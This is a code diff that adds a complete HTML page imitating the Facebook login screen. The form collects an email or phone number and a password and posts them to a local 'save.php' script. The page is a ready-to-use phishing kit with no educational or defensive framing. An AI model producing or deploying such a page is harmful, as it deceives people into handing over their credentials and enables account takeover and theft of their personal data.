@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .logo {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 95%;
+            padding: 14px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #166fe5;
+        }
+        .forgot {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin: 10px 0;
+        }
+        hr {
+            margin: 20px 0;
+            border: 0.5px solid #dadde1;
+        }
+        .create-btn {
+            background: #42b72a;
+            width: auto;
+            padding: 12px 20px;
+            display: inline-block;
+            border-radius: 6px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .create-btn:hover {
+            background: #36a420;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">facebook</div>
+            <form method="POST" action="save.php">
+                <input type="text" name="email" placeholder="Email address or phone number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <a href="#" class="forgot">Forgotten password?</a>
+            <hr>
+            <div class="create-btn">Create new account</div>
+        </div>
+    </div>
+</body>
+</html>
